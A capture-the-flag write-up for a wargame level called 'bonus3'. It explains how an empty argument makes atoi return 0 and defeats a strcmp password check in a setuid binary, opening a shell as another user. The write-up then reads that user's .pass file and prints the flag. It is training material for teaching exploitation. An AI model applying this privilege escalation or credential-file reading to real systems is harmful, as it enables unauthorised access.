# Bonus3

## 1. Context

```bash
$ id
uid=2013(bonus3) gid=2013(bonus3) groups=2013(bonus3),100(users)

$ pwd
/home/user/bonus3

$ ls -la
[...]
-rwsr-s---+ 1 end    users  5595 Mar  6  2016 bonus3
[...]
```

## 2. Program behavior

```bash
./bonus3 42

```

Expects an argument and does nothing.

## 3. Code overview

The program need at least 1 argument `argv[1]` otherwise it exits, the program also reads the .pass file for next level and store it into a buffer via `fread()`.
Then the program calls `atoi()` with `argv[1]` as a parameter and uses the result as an index for our buffer, at that index the program inserts a null byte.
After that, the program do a comparaison on our buffer, it must be equal to argv[1] so that we execute a shell.
The thing is we don't know the flag! But if we input an empty string as first argument, `atoi()` will return `0` since the string does not contain a numeric value representation.
Therefore it will replace the first character in the buffer with a `\0` (`buffer[atoi("")] = 0`), and since strcmp stops at `\0` both string will be considered identical.

## 4. Getting the flag

```bash
$ ./bonus3 "" or ./bonus3 ''
$ whoami
end
$ cat /home/user/end/.pass                   
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

End of simulation
